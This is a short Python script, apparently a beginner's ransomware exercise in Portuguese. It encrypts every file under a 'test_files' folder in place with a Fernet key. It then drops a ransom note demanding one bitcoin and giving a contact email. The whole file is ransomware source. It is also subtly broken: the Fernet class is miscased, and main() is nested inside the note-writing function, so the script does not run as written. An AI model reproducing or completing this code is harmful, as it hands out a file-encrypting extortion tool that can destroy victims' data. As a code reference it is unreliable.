from cryptography.fernet import fernet
import os

def gerar_chave():
    chave = fernet.generate_key()
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)

def carregar_chave():
    return open("chave.key", "rb").read()

def criptografar_arquivo(arquivo, chave):
    f = fernet(chave)
    with open(arquivo, "rb") as file:
        dados= file.read()
    dados_encriptados = f.encrypt(dados)
    with open(arquivo, "wb") as file:
        file.write(dados_encriptados)

def encontrar_arquivos(diretorio):
    lista = []
    for raiz, _, arquivos in os.walk(diretorio):
        for nome in arquivos:
            caminho = os.path.join(raiz, nome)
            if nome != "ransoware.py" and not nome.endswith(".key"):
                lista.append(caminho)
    return lista

def criar_mensagem_resgate():
    with open("LEIA ISSO!!!.txt", "w" ) as f:
        f.write("Seus arquivos foram sequestrados! \n")
        f.write("Envie 1 bitcoin para o TheKiller e envie um email com o comprovante para thesoldier@hotmail.com \n")
        f.write("Só após isso devolveremos seus arquivos intactos! \n")

        def main():
            gerar_chave()
            chave = carregar_chave()
            arquivos = encontrar_arquivos("test_files")
            for arquivo in arquivos:
             criptografar_arquivo(arquivo, chave)
            criar_mensagem_resgate()
            print("Ransoware executado!Você pegou virus!")

if __name__=="__main__":
    main()
    